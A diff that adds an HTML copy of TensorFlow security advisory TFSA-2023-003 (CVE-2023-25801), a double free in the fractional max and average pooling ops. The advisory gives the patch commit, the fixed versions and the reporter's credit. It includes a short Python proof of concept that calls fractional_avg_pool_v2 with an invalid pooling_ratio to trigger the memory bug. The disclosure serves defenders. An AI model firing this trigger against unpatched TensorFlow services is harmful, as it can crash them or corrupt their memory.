@@ -1,0 +1,31 @@
+<h2>TFSA-2023-003: Double free in Fractional(Max/Avg)Pool</h2>
+<h3>CVE Number</h3>
+<p>CVE-2023-25801</p>
+<h3>Impact</h3>
+<p><code>nn_ops.fractional_avg_pool_v2</code> and <code>nn_ops.fractional_max_pool_v2</code> require the first and fourth elements of their parameter <code>pooling_ratio</code> to be equal to 1.0, as pooling on batch and channel dimensions is not supported.</p>
+<p><code>python
+import tensorflow as tf
+import os
+import numpy as np
+from tensorflow.python.ops import nn_ops
+try:
+  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)
+  arg_0 = tf.identity(arg_0_tensor)
+  arg_1_0 = 2
+  arg_1_1 = 3
+  arg_1_2 = 1
+  arg_1_3 = 1
+  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]
+  arg_2 = True
+  arg_3 = True
+  seed = 341261001
+  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)
+except Exception as e:
+  print("Error:"+str(e))</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/ee50d1e00f81f62a4517453f721c634bbb478307">ee50d1e00f81f62a4517453f721c634bbb478307</a>.</p>
+<p>The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability was reported by <a href="https://github.com/dmc1778">dmc1778</a>, of <a href="mailto:nimashiri2012@gmail.com">nimashiri2012@gmail.com</a>.</p>
